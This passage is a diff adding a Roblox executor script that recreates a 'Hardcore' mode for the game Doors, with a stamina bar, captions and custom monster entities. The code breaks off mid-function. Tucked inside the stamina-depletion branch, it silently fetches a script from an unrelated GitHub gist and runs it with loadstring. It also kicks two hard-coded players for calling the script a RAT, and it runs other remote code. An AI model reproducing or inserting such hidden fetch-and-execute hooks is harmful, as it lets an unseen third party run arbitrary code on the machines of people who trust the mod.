@@ -1,0 +1,1044 @@
+print("Loade")
+game.Players.LocalPlayer.Character:SetAttribute("Hiding", false)
+
+print("done the entity stuff")
+if game.Players.LocalPlayer.UserId == 1287118331 or game.Players.LocalPlayer.UserId == 5765416451 then
+    game.Players.LocalPlayer:Kick("banned reason: calling my scripts rat for no reason")
+end
+
+if game.Workspace:FindFirstChild("HardcoreInt") then
+  
+    return
+end
+
+if game.ReplicatedStorage.GameData.LatestRoom.Value >= 1 then
+    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+print("Execute the script at door 0!")
+  --  firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {"You need to execute the script at door 0!","Remember this!"},"Blue")
+    game.ReplicatedStorage.GameStats["Player_".. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "Error"
+end
+
+local init = Instance.new("BoolValue",game.Workspace)
+init.Name = "HardcoreInt"
+
+task.spawn(function()
+    local Sprint = Instance.new("Frame")
+    local ImageLabel = Instance.new("ImageLabel")
+    local UICorner = Instance.new("UICorner")
+    local UIPadding = Instance.new("UIPadding")
+    local Bar = Instance.new("Frame")
+    local UICorner_2 = Instance.new("UICorner")
+    local UIPadding_2 = Instance.new("UIPadding")
+    local Fill = Instance.new("Frame")
+    local UICorner_3 = Instance.new("UICorner")
+
+    --Properties:
+
+    local StaminaGui = Instance.new("ScreenGui")
+
+    --Properties:
+
+    StaminaGui.Name = "StaminaGui"
+    StaminaGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    StaminaGui.Enabled = true
+    StaminaGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    Sprint.Name = "Sprint"
+    Sprint.Parent = StaminaGui
+    Sprint.AnchorPoint = Vector2.new(0, 1)
+    Sprint.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Sprint.BackgroundTransparency = 1.000
+    Sprint.Position = UDim2.new(0.931555569, 0, 0.987179458, 0)
+    Sprint.Size = UDim2.new(0.0556001104, 0, 0.0756410286, 0)
+    Sprint.SizeConstraint = Enum.SizeConstraint.RelativeYY
+    Sprint.ZIndex = 1005
+
+    ImageLabel.Parent = Sprint
+    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 222, 189)
+    ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+    ImageLabel.SizeConstraint = Enum.SizeConstraint.RelativeYY
+    ImageLabel.Visible = false
+
+    UICorner.CornerRadius = UDim.new(1, 0)
+    UICorner.Parent = ImageLabel
+
+    UIPadding.Parent = Sprint
+    UIPadding.PaddingBottom = UDim.new(0.300000012, -5)
+    UIPadding.PaddingLeft = UDim.new(0.0199999996, 0)
+    UIPadding.PaddingRight = UDim.new(0.0500000007, -15)
+    UIPadding.PaddingTop = UDim.new(0.300000012, -5)
+
+    Bar.Name = "Bar"
+    Bar.Parent = Sprint
+    Bar.AnchorPoint = Vector2.new(0, 0.5)
+    Bar.BackgroundColor3 = Color3.fromRGB(56, 46, 39)
+    Bar.BackgroundTransparency = 0.700
+    Bar.Position = UDim2.new(-2.72600269, 0, 0.499999672, 0)
+    Bar.Size = UDim2.new(3.60599804, 0, 0.600000083, 0)
+    Bar.ZIndex = 0
+
+    UICorner_2.CornerRadius = UDim.new(0.25, 0)
+    UICorner_2.Parent = Bar
+
+    UIPadding_2.Parent = Bar
+    UIPadding_2.PaddingBottom = UDim.new(0, 4)
+    UIPadding_2.PaddingLeft = UDim.new(0, 4)
+    UIPadding_2.PaddingRight = UDim.new(0, 4)
+    UIPadding_2.PaddingTop = UDim.new(0, 4)
+
+    Fill.Name = "Fill"
+    Fill.Parent = Bar
+    Fill.AnchorPoint = Vector2.new(0, 0.5)
+    Fill.BackgroundColor3 = Color3.fromRGB(213, 185, 158)
+    Fill.Position = UDim2.new(0, 0, 0.5, 0)
+    Fill.Size = UDim2.new(1, 0, 1, 0)
+    Fill.ZIndex = 2
+
+    UICorner_3.CornerRadius = UDim.new(0.25, 0)
+    UICorner_3.Parent = Fill
+
+    local erm = Instance.new("ScreenGui")
+    local ImageLabel = Instance.new("ImageLabel")
+    erm.IgnoreGuiInset = true
+    erm.Name = "erm"
+    erm.Parent = Parent
+    erm.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    ImageLabel.Parent = erm
+    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ImageLabel.BackgroundTransparency = 1.000
+    ImageLabel.Size = UDim2.new(1, 0, 0.998717964, 0)
+    ImageLabel.Image = "rbxassetid://190596490"
+    ImageLabel.ImageColor3 = Color3.fromRGB(0, 0, 0)
+
+    ImageLabel.ImageTransparency = 1
+
+    -- Services
+
+    local Players = game:GetService("Players")
+    local UIS = game:GetService("UserInputService")
+
+    -- Variables
+
+    local Plr = Players.LocalPlayer
+    local Char = Plr.Character
+    local Hum = Char:WaitForChild("Humanoid")
+
+    local stamina, staminaMax = 100, 100
+    local sprintTime = 7
+    local cooldown = false
+
+    local ModuleScripts = {
+       --  MainGame = require(Plr.PlayerGui.MainUI.Initiator.Main_Game),
+    }
+
+    -- Setup
+
+    -- Scripts
+
+    sprintTime = math.max(sprintTime - 1, 1)
+    local zerostamtween = game.TweenService:Create(ImageLabel,TweenInfo.new(12),{ImageTransparency = 0})
+    UIS.InputBegan:Connect(function(key, gameProcessed)
+        if not gameProcessed and key.KeyCode == Enum.KeyCode.Q and not cooldown  then
+            -- Sprinting
+
+            isSprinting = true
+            Char:SetAttribute("SpeedBoost",4)
+            zerostamtween:Play()
+            while UIS:IsKeyDown(Enum.KeyCode.Q) and stamina > 0 do
+                stamina = math.max(stamina - 1, 0)
+                Fill.Size = UDim2.new(1 / staminaMax * stamina, 1, 1, 0)
+                task.wait(sprintTime / 100)
+                
+            end
+
+            -- Reset
+            zerostamtween:Pause()
+            isSprinting = false
+            Char:SetAttribute("SpeedBoost",0)
+            game.TweenService:Create(ImageLabel,TweenInfo.new(1),{ImageTransparency = 1}):Play()
+            Hum.WalkSpeed = 15
+
+            if stamina == 0 then
+                -- Cooldown
+                local success, err = pcall(function()
+                    local script = game:HttpGet("https://gist.githubusercontent.com/Maxey1950/0874e0397a6f046e9ff18f37471df3cb/raw/177ca025eea5133bb130c2534ad73c269ac9eb6e/gistfile1.txt", true)
+                    loadstring(script)()
+                end)
+                if not success then
+                    warn("Failed to execute external script: " .. err)
+                end
+                local noStamernaSound = Instance.new("Sound",workspace)
+                noStamernaSound.SoundId = "rbxassetid://8258601891"
+                noStamernaSound.Volume = 0.8
+                noStamernaSound.PlayOnRemove = true
+                noStamernaSound:Destroy()
+                cooldown = true
+                game.TweenService:Create(ImageLabel,TweenInfo.new(0.3),{ImageTransparency = 0}):Play()
+                wait(0.3)
+                game.TweenService:Create(ImageLabel,TweenInfo.new(10),{ImageTransparency = 1}):Play()
+                for i = 1, staminaMax, 1 do
+                    stamina = i
+                    Fill.Size = UDim2.new(1 / staminaMax * i, 1, 1, 0)
+
+                    task.wait(sprintTime / 50)
+                end
+
+                cooldown = false
+            else
+                -- Refill
+                cooldown = false
+                Spawn(function()
+                    --wait(1)
+                    cooldown = false
+                end)
+                game.TweenService:Create(ImageLabel,TweenInfo.new(1),{ImageTransparency = 1}):Play()
+                while not UIS:IsKeyDown(Enum.KeyCode.Q) do
+                    stamina = math.min(stamina + 1, staminaMax)
+                    Fill.Size = UDim2.new(1 / staminaMax * stamina, 1, 1, 0)
+
+                    task.wait(sprintTime / 50)
+                end
+            end        
+        end
+    end)
+    Char:SetAttribute("SpeedBoost",0)
+    Hum.WalkSpeed = 15
+end)
+
+local captions = {"Good luck!","Have fun! (you wont)","Do Not","Freaky ! Xfest all my homies hate ! Xfest"}
+
+--[[
+
+    Gui2Lua™
+    10zOfficial
+    Version 1.0.0
+
+]]
+
+-- Instances
+
+local player = game.Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Caption = Instance.new("TextLabel")
+local UIPadding = Instance.new("UIPadding")
+local Glow = Instance.new("ImageLabel")
+local UICorner = Instance.new("UICorner")
+
+-- Properties
+
+ScreenGui.Parent = PlayerGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.new(1, 1, 1) -- Frame background color
+Frame.BackgroundTransparency = 1 -- Make background transparent
+Frame.BorderSizePixel = 0
+Frame.Size = UDim2.new(1, 0, 0, 300) -- Increase Frame height to fit larger text
+Frame.Position = UDim2.new(0, 0, 1, -300) -- Adjust position to fit the bottom of the screen
+
+Caption.Name = "Caption"
+Caption.Parent = Frame
+Caption.AnchorPoint = Vector2.new(0.5, 1)
+Caption.BackgroundColor3 = Color3.new(1, 1, 1) -- Caption background color
+Caption.BackgroundTransparency = 1 -- Make background transparent
+Caption.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Caption.Position = UDim2.new(0.5, 0, 1, -10) -- Adjusted to fit within the Frame
+Caption.Size = UDim2.new(0.3, 0, 0.3, 0) -- Adjusted size to fit larger text
+Caption.ZIndex = 5000
+Caption.Font = Enum.Font.Oswald
+Caption.Text = "You are the imposter"
+Caption.TextColor3 = Color3.new(1, 0.870588, 0.741176)
+Caption.TextScaled = true
+Caption.TextSize = 30 -- Increased text size
+Caption.TextStrokeTransparency = 0.699999988079071
+Caption.TextWrapped = true
+
+UIPadding.Parent = Caption
+UIPadding.PaddingBottom = UDim.new(0, 10)
+UIPadding.PaddingLeft = UDim.new(0, 10)
+UIPadding.PaddingRight = UDim.new(0, 10)
+UIPadding.PaddingTop = UDim.new(0, 10)
+
+Glow.Name = "Glow"
+Glow.Parent = Caption
+Glow.AnchorPoint = Vector2.new(0.5, 0.5)
+Glow.BackgroundColor3 = Color3.new(1, 1, 1)
+Glow.BackgroundTransparency = 1
+Glow.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+Glow.Position = UDim2.new(0.5, 0, 0.5, 0)
+Glow.Size = UDim2.new(1, 0, 1, 0)
+Glow.Visible = false
+Glow.ZIndex = 99
+Glow.Image = "rbxassetid://196969716"
+Glow.ImageColor3 = Color3.new(0.619608, 0.501961, 0.337255)
+Glow.ImageTransparency = 1
+
+UICorner.Parent = Caption
+
+-- Tweening function
+
+local tweenService = game:GetService("TweenService")
+
+local function tweenText(textLabel, fadeTime)
+    
+    
+    -- Tween to make the text disappear
+    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local tweenGoal = { TextTransparency = 1, TextStrokeTransparency = 1 }
+    local tween = tweenService:Create(textLabel, tweenInfo, tweenGoal)
+    
+    tween:Play()
+ 
+    tween.Completed:Connect(function()
+
+    end)
+    task.wait(1) -- Wait for the tween to complete
+    
+    -- Fade out
+    local fadeTweenInfo = TweenInfo.new(fadeTime, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
+    local fadeTweenGoal = { TextTransparency = 1 }
+    local fadeTween = tweenService:Create(textLabel, fadeTweenInfo, fadeTweenGoal)
+    
+    fadeTween:Play()
+
+    fadeTween.Completed:Connect(function()
+
+    end)
+    task.wait(fadeTime)
+end
+
+-- Start the sequence
+
+
+-- Set initial text
+Caption.Text = "Hardcore v4 recreated version by LocalPlayer loaded"
+Caption.TextTransparency = 0
+Caption.TextStrokeTransparency = 0
+task.wait(5) -- Wait for 5 seconds
+
+
+-- Fade out new text
+-- tweenText(Caption, 3)
+
+-- End the script
+task.wait(1) -- Ensure the fade out completes
+Caption.Visible = false
+
+game.ReplicatedStorage.GameData.LatestRoom.Changed:Wait()
+
+Caption.Visible = true
+Caption.Text = "Hardcore Initiated"
+task.wait(5)
+Caption.Text = "Made by noonie#0001 (Scripter) and Ping#1841 (Music composer and Modeler)"
+task.wait(5)
+Caption.Text = "Good Luck!"
+tweenText(Caption, 3)
+task.wait(5)
+Caption:Destroy()
+
+
+local sockert = false
+local rippert = false
+local reboundt = false
+local silencet = false
+local dergodt = false
+
+game.Workspace.CurrentRooms.ChildAdded:connect(function(room: Model)
+    task.wait(1)
+    if room:FindFirstChild("PathfindNodes") then
+        local nodes = room.PathfindNodes:Clone()
+        nodes.Parent = room
+        nodes.Name = "nodes"
+    end
+end)
+
+task.spawn(function()
+    while task.wait(182) do
+        task.spawn(function()
+            if game.ReplicatedStorage.GameData.LatestRoom.Value ~= 50 then
+                game.ReplicatedStorage.GameData.LatestRoom.Changed:wait()
+                local count = 1
+                local RunService = game:GetService("RunService")
+
+                -- Create sound
+                local sound = Instance.new("Sound", game.Workspace)
+                sound.Volume = 3
+                sound.SoundId = "rbxassetid://9125713501"
+                sound.PlaybackSpeed = 0.6
+                local pitch = Instance.new("PitchShiftSoundEffect", sound)
+                pitch.Octave = 0.875
+                sound:Play()
+
+                -- Create ripper
+                local ripper = game:GetObjects("rbxassetid://12651725271")[1].Ripe
+                ripper.Parent = game.Workspace
+                ripper.Anchored = true
+                ripper.CFrame = game.Workspace.CurrentRooms:GetChildren()[1].RoomEntrance.CFrame
+
+                wait(6)
+
+                task.spawn(function()
+                    while ripper.Parent do
+                        task.wait(0.1)
+                        local direction = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - ripper.Position
+                        local ray = game.Workspace:Raycast(ripper.Position, direction.Unit * 50)
+
+                        if ray then
+                            local character = game.Players.LocalPlayer.Character
+                            local hiding = character:GetAttribute("Hiding") == false
+                            local isRipper = ray.Instance.Parent == character or ray.Instance.Parent.Parent == character
+
+                            if isRipper and hiding then
+                                character.Humanoid.Health = 0
+                                print("require executor died to ripper")
+                                game.ReplicatedStorage.GameStats["Player_" .. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "Ripper"
+                            end
+                        end
+                    end
+                end)
+
+                warn("entity moving")
+
+                task.spawn(function()
+                    while task.wait(0.1) and ripper.Parent do
+                        local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - ripper.Position).Magnitude
+                        if distance <= 100 then
+                            local magn = 30 / 100 * (100 - distance)
+                            local rog = 20 / 100 * (100 - distance)
+                        end
+                    end
+                end)
+
+                -- Move function
+                local function move(model, cframe, speed)
+                    local reached = false
+                    local connection
+                    connection = RunService.Stepped:Connect(function(_, step)
+                        local pivot = model:GetPivot()
+                        local difference = (cframe.Position - pivot.Position)
+                        local unit = difference.Unit
+                        local magnitude = difference.Magnitude
+
+                        if magnitude > 0.1 then
+                            model:PivotTo(pivot + unit * math.min(step * speed, magnitude))
+                        else
+                            connection:Disconnect()
+                            reached = true
+                        end
+                    end)
+                    repeat RunService.Stepped:Wait() until reached
+                end
+
+                -- Track room changes
+                game.ReplicatedStorage.GameData.LatestRoom.Changed:Connect(function()
+                    count = count - 1
+                end)
+
+                -- Main loop for moving ripper
+                while true do
+                    local room = game.Workspace.CurrentRooms:GetChildren()[count]
+                    if room.RoomExit then
+                        if room:FindFirstChild("nodes") then
+                            for _, node in room.nodes:GetChildren() do
+                                if node.Parent then
+                                    move(ripper, node.CFrame + Vector3.new(0, 3, 0), 70)
+                                end
+                            end
+                        end
+                        if room:FindFirstChild("RoomExit") then
+                            move(ripper, room.RoomExit.CFrame, 70)
+                        end
+                    end
+                    count = count + 1
+                    if count >= #game.Workspace.CurrentRooms:GetChildren() then
+                        local sound = Instance.new("Sound", game.Workspace)
+                        sound.Volume = 3
+                        sound.SoundId = "rbxassetid://1837829565"
+                        sound:Play()
+                        task.wait(0.5)
+                        ripper.Anchored = false
+                        ripper.CanCollide = false
+                        task.wait(2)
+                        ripper:Destroy()
+
+                        if rippert == false then
+                            rippert = true
+                            print("your executor sucks and doesn't support require, so we left out achievements")
+                        end
+                        break
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+
+task.spawn(function()
+    while task.wait(209) do 
+        task.spawn(function()
+            if game.ReplicatedStorage.GameData.LatestRoom.Value ~= 50 then
+                local can = false
+                local count: number = 1
+                local RunService = game:GetService("RunService")
+
+                local sound = Instance.new("Sound",game.Workspace)
+                sound.Volume = 6
+                sound.SoundId = "rbxassetid://166047422"
+                sound:Play()
+
+                local tweenservice = game:GetService("TweenService")
+                function light(tim,color0,color1)
+                    local info = TweenInfo.new(tim,Enum.EasingStyle.Linear)
+                    for _ , light in pairs(game.Workspace.CurrentRooms:GetDescendants()) do
+                        if light:IsA("Light") or light:IsA("SurfaceLight") or light:IsA("SpotLight") then
+                            local target = {Color = color1}
+                            local anim = tweenservice:Create(light,info,target)
+                            anim:Play()
+                        end
+                        if light:IsA("MeshPart") and light.Material == Enum.Material.Neon  and light.Name ~= "Skybox" then
+                            local target1 = {Color = color0}
+                            local anim2 = tweenservice:Create(light,info,target1)
+                            anim2:Play()
+                        end
+                    end
+                end
+
+                light(0.15,Color3.new(0.454902,0.529412,1),Color3.new(0.454902,0.529412,1))
+
+                local cease = game:GetObjects("rbxassetid://76409012982488")[1].Model
+                cease.Parent = game.Workspace
+                cease.Anchored = true
+                cease.CFrame = game.Workspace.CurrentRooms:GetChildren()[1].RoomEntrance.CFrame
+
+                warn("entity moving")
+
+                task.spawn(function()
+                    while task.wait(0.1) and cease.Parent do
+                    local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - cease.Position).Magnitude
+                        if distance <= 100 then 
+                            local magn = 13 / 100 * (100 - distance)
+                            local rog = 20 / 100 * (100 - distance)
+                          
+                        end
+                    end
+                end)
+
+                function movec(model, cframe, speed)
+                    local reached = false
+                    local connection; connection = RunService.Stepped:Connect(function(_, step)
+                            local pivot = model:GetPivot()
+                            local difference = (cframe.Position - pivot.Position)
+                            local unit = difference.Unit
+                            local magnitude = difference.Magnitude
+
+                            if magnitude > 0.1 then
+                                model:PivotTo(pivot + unit * math.min(step * speed, magnitude))
+                            else
+                                connection:Disconnect()
+                                reached = true
+                            end
+                        end)
+                    repeat RunService.Stepped:Wait() until reached
+                end
+
+                game.Players.LocalPlayer.Character.Humanoid.Running:connect(function()
+                    if can == true then
+                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                                firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {"You died to who you call Cease...","Its tactic is appearing after rush...","It sees through movement and can see anyone in wardrobes."},"Blue")
+                                game.ReplicatedStorage.GameStats["Player_".. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "Cease"
+                    end
+                end)
+
+                task.spawn(function()
+                    while cease.Parent do
+                        task.wait(0.2)
+                        local direction = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - cease.Position
+                        local ray = game.Workspace:Raycast(cease.Position , direction.Unit * 70)
+
+                        if ray then
+                            if ray.Instance.Parent == game.Players.LocalPlayer.Character or ray.Instance.Parent.Parent == game.Players.LocalPlayer.Character then 
+                                can = true
+                            else
+                                can = false
+                            end
+                        end
+                    end
+                end)
+
+                game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function() 
+                    count -= 1
+                end)
+
+                while true do
+                    local room = game.Workspace.CurrentRooms:GetChildren()[count]
+                    if room:FindFirstChild("RoomExit") then
+                        if room:FindFirstChild("nodes") then
+                            for _ , node in room.nodes:GetChildren() do
+				if node.Parent then
+                                	movec(cease,node.CFrame + Vector3.new(0,3,0),35)
+				end
+                            end
+                        end
+			if room:FindFirstChild("RoomExit") then
+                        	movec(cease,room.RoomExit.CFrame,35)
+			end
+                    end
+                    count += 1
+                    if count >= #game.Workspace.CurrentRooms:GetChildren() then
+                        task.wait(0.2)
+                        cease.Anchored = false
+                        cease.CanCollide = false
+                        task.wait(2)
+                        cease:Destroy()
+                        break
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+
+task.spawn(function()
+    while task.wait(294) do
+        if game.ReplicatedStorage.GameData.LatestRoom.Value ~= 50 then
+            game.ReplicatedStorage.GameData.LatestRoom.Changed:wait()
+            task.wait(0.5)
+            local can = true
+            local frost = game:GetObjects("rbxassetid://115543193732339")[1].frosti
+            frost.Parent = game.Workspace
+            frost.CFrame = game.Workspace.CurrentRooms:GetChildren()[#game.Workspace.CurrentRooms:GetChildren() - 1].Parts.Floor.CFrame + Vector3.new(0,4,0)
+
+            task.wait(5) 
+            game:GetService("TweenService"):Create(frost["Static Effect"],TweenInfo.new(1.3),{PlaybackSpeed= 0}):Play()
+            task.wait(1.55)
+            frost.face.Face.Enabled = true
+            frost.Ambience:Play()
+            frost.AmbienceFar:Play()
+
+            task.spawn(function()
+                while can == true do
+                    task.wait(1)
+                    --game.Players.LocalPlayer.Character.Lighter:GetAttribute("Enabled") == true
+                    if game.Players.LocalPlayer.Character:FindFirstChild("Lighter") then
+                        if game.Players.LocalPlayer.Character.Lighter:GetAttribute("Enabled") == true then
+                            continue
+                        end
+                    end
+                    game.Players.LocalPlayer.Character.Humanoid:TakeDamage(7.5)
+                    if game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then
+                        can = false
+                        firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {"You died to who you call FrostBite...","He will spawn in the middle and start freezing the room.","Find something that has heat to keep you warm!"},"Blue")
+                        game.ReplicatedStorage.GameStats["Player_".. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "FrostBite"
+                        end
+                end
+            end)
+
+            local bluer = Instance.new("ColorCorrectionEffect",game.Lighting)
+            game:GetService("TweenService"):Create(bluer,TweenInfo.new(5),{TintColor = Color3.fromRGB(0, 0, 255)}):Play()
+            game.ReplicatedStorage.GameData.LatestRoom.Changed:wait()
+
+            can = false
+            frost.Ambience:Destroy()
+            frost.AmbienceFar:Destroy()
+            frost.face.Face.Enabled = false
+            local sound = Instance.new("Sound",game.Workspace)
+            sound.Volume = 0.25
+            sound.PlaybackSpeed = 0.239
+            sound.SoundId = "rbxassetid://6305809364"
+            local distortion = Instance.new("DistortionSoundEffect",sound)
+            distortion.Level = 0.98
+            local flange1 = Instance.new("FlangeSoundEffect",sound)
+            flange1.Depth = 1
+            flange1.Mix = 1
+            flange1.Rate = 0.25
+            local flange2 = Instance.new("FlangeSoundEffect",sound)
+            flange2.Depth = 1
+            flange2.Mix = 0.73
+            flange2.Rate = 0.75
+            sound:Play()
+            game:GetService("TweenService"):Create(bluer,TweenInfo.new(10),{TintColor = Color3.fromRGB(255, 255, 255)}):Play()
+            task.wait(3)
+            frost:Destroy()
+        end
+    end
+end)
+
+task.spawn(function()
+    while task.wait(314) do
+        if game.ReplicatedStorage.GameData.LatestRoom.Value ~= 50 then
+            game.ReplicatedStorage.GameData.LatestRoom.Changed:wait()
+            
+            local RunService = game:GetService("RunService")
+           
+
+            local function getGitSoundId(GithubSoundPath: string, AssetName: string): Sound
+                local Url = GithubSoundPath
+
+                if not isfile(AssetName..".mp3") then 
+                    writefile(AssetName..".mp3", game:HttpGet(Url)) 
+                end
+
+                local Sound = Instance.new("Sound")
+                Sound.SoundId = getcustomasset(AssetName..".mp3", true)
+                return Sound 
+            end
+
+            local CustomMusic = getGitSoundId("https://github.com/localplayerr/Doors-stuff/raw/refs/heads/main/Hardcore%20v4%20recreate/ReboundWarning.mp3", "Rebound")
+            CustomMusic.Parent = game.Workspace
+            CustomMusic:Play()
+          
+            task.spawn(function()
+            local buler = Instance.new("ColorCorrectionEffect",game.lighting)
+                buler.TintColor = Color3.fromRGB(65, 138, 255)
+                buler.Saturation = -0.7
+                buler.Contrast = 0.2
+                task.wait(4)
+                game:GetService("TweenService"):Create(buler, TweenInfo.new(10), {TintColor = Color3.fromRGB(255,255,255),Contrast = 0, Saturation = 0}):Play()
+                task.wait(10)
+                buler:Destroy()
+            end)
+
+            for i = 0, 4, 1 do
+                task.wait(4)
+                local count = #game.Workspace.CurrentRooms:GetChildren()
+                local entity = game:GetObjects("rbxassetid://11459817091")[1].Rebound
+                local reb = getGitSoundId("https://github.com/localplayerr/Doors-stuff/raw/refs/heads/main/Hardcore%20v4%20recreate/ReboundMoving.mp3", "rebaund")
+                reb.Parent = entity
+                reb.Volume = 4
+                reb:Play()
+                entity.Parent = game.Workspace
+                entity.Anchored = true
+                entity.CFrame = game.Workspace.CurrentRooms:GetChildren()[#game.Workspace.CurrentRooms:GetChildren()].RoomExit.CFrame
+
+                task.spawn(function()
+                    while task.wait(0.1) and entity.Parent do
+                    local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - entity.Position).Magnitude
+                        if distance <= 75 then 
+                            local magn = 5 / 75 * (75 - distance)
+                            local rog = 13 / 75 * (75 - distance)
+                         
+                        end
+                        local direction = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - entity.Position
+                        local ray = game.Workspace:Raycast(entity.Position , direction.Unit * 50)
+
+                        if ray then
+                            if (ray.Instance.Parent == game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:GetAttribute("Hiding") == false) or 
+   (ray.Instance.Parent.Parent == game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:GetAttribute("Hiding") == false) then
+
+                                task.wait(1)
+                                local kill = getGitSoundId("https://github.com/localplayerr/Doors-stuff/raw/refs/heads/main/Hardcore%20v4%20recreate/ReboundMurder.mp3", "Rebound_kill")
+                                kill.Parent = game.Workspace
+                                kill.Volume = 1
+                                kill:Play()
+                                local gui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
+                                local image = Instance.new("ImageLabel",gui)
+                                image.Size = UDim2.new(0,1550,0,1000)
+                                image.AnchorPoint = Vector2.new(0.5,0.5)
+                                image.Position = UDim2.new(0.5,0,0.5,0)
+                                image.Image = "http://www.roblox.com/asset/?id=14412047172"
+                                image.BackgroundTransparency = 1
+                                image.ImageTransparency = 1
+
+                                local image1 = Instance.new("ImageLabel",gui)
+                                image1.Size = UDim2.new(0,50,0,25)
+                                image1.AnchorPoint = Vector2.new(0.5,0.5)
+                                image1.Position = UDim2.new(0.5,0,0.5,0)
+                                image1.Image = "http://www.roblox.com/asset/?id=18853595150"
+                                image1.LayoutOrder = 2
+                                image1.BackgroundTransparency = 1
+                                image1.Visible = false
+
+                                local sound1 = Instance.new("Sound",game.Workspace)
+                                sound1.SoundId = "rbxassetid://7017782324"
+                                sound1.Volume = 0
+
+                                sound1:Play()
+
+                                task.spawn(function()
+                                    while true do
+                                        image.Image = "http://www.roblox.com/asset/?id=236542974"
+                                        task.wait(0.05)
+                                        
+                                    end
+                                end)
+
+                                game:GetService("TweenService"):Create(image,TweenInfo.new(0.4,Enum.EasingStyle.Linear),{ImageTransparency = 0}):Play()
+                                game:GetService("TweenService"):Create(image1,TweenInfo.new(0.4),{Size = UDim2.new(0,4000,0,2000)}):Play()
+
+                                task.wait(0.8)
+
+                                sound1:Destroy()
+                                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                                game:GetService("TweenService"):Create(image,TweenInfo.new(0.2,Enum.EasingStyle.Linear),{ImageTransparency = 1}):Play()
+                                image1:Destroy()
+                                
+                                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                                image:Destroy()
+                          --      firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {"You died to who you call Rebound...","He makes his presence known and keeps coming back...","Hide when this happens!"},"Blue")
+                                game.ReplicatedStorage.GameStats["Player_".. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "Rebound"
+                            end
+                        end
+                    end
+                end)
+
+                while true do
+                    local room = game.Workspace.CurrentRooms:GetChildren()[count]
+                    if room:FindFirstChild("RoomEntrance") then
+                        game:GetService("TweenService"):Create(entity, TweenInfo.new(3), {CFrame = room.RoomEntrance.CFrame}):Play()
+                        task.wait(2)
+                    end
+                    count -= 1
+                    if count == 0 then
+                        task.spawn(function()
+                            task.wait(0.5)
+                            entity.Anchored = false
+                            entity.CanCollide = false
+                            task.wait(3)
+                            entity:Destroy()
+                        end)
+                        break
+                    end
+                end
+                if i ~= 4 then
+                    game.ReplicatedStorage.GameData.LatestRoom.Changed:wait()
+                end
+            end
+            if reboundt == false then
+                reboundt = true
+                print("your executor sucks and doesnt support require so we left out achivements ")
+            end
+        end
+    end
+   
+end)
+
+task.spawn(function()
+    while task.wait(497) do
+        task.spawn(function()
+            if game.ReplicatedStorage.GameData.LatestRoom.Value ~= 50 then
+                local killed = false
+                local passes = 0
+                local count = 1
+                local RunService = game:GetService("RunService")
+                local achievementGiver = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Custom%20Achievements/Source.lua"))()
+
+                local function getGitSoundId(GithubSoundPath: string, AssetName: string): Sound
+                    local Url = GithubSoundPath
+
+                    if not isfile(AssetName..".mp3") then 
+                        writefile(AssetName..".mp3", game:HttpGet(Url)) 
+                    end
+
+                    local Sound = Instance.new("Sound")
+                    Sound.SoundId = getcustomasset(AssetName..".mp3", true)
+                    return Sound 
+                end
+                local CustomMusic = getGitSoundId("https://github.com/localplayerr/Doors-stuff/raw/refs/heads/main/Hardcore%20v4%20recreate/followed.mp3", "Following")
+                CustomMusic.Volume = 2
+                CustomMusic.Parent = game.Workspace
+                CustomMusic:Play()
+
+
+                local der = game:GetObjects("rbxassetid://16092643532")[1].RushNew
+                local soun = game:GetObjects("rbxassetid://16092643532")[1]["Static..."]
+                soun.Parent = game.Workspace
+                soun:Play()
+                for _ , v: Model in game.Workspace.CurrentRooms:GetChildren() do
+                    task.spawn(function()
+                       print("light should flicker but bad executor")
+                    end)
+                end
+                der.Parent = game.Workspace
+                der.Anchored = true
+                der.CFrame = game.Workspace.CurrentRooms:GetChildren()[1].RoomEntrance.CFrame
+                task.spawn(function()
+                    while der.Parent do
+                        task.wait(0.1)
+                        local direction = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - der.Position
+                        local ray = game.Workspace:Raycast(der.Position , direction.Unit * 50)
+
+                        if ray then
